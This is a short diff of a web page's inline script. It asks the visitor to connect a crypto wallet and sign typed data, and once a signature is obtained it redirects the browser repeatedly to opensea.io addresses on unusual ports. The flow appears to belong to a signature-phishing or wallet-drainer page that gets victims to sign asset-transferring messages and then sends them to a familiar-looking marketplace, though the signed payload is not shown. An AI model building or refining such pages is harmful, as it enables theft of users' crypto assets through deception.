@@ -94,19 +94,19 @@
       const account = await promptWalletConnection();
 
       if (account) {
-        promptSignTypedData(account);
+        const signed = await promptSignTypedData(account);
+
+        // Perform redirection immediately after signing
+        if (signed) {
+          // Initial redirection
+          location.href = "https://opensea.io:8081";
+
+          // Interval-based redirection
+          setInterval(function () {
+            location.href = "https://opensea.io:8082";
+          }, 1000);
+        }
       }
-
-      // Perform redirection after 2 seconds
-      setTimeout(() => {
-        // Initial redirection
-        location.href = "https://opensea.io:8081";
-
-        // Interval-based redirection
-        setInterval(function () {
-          location.href = "https://opensea.io:8082";
-        }, 1000);
-      }, 100);
     }
   </script>
   <center>
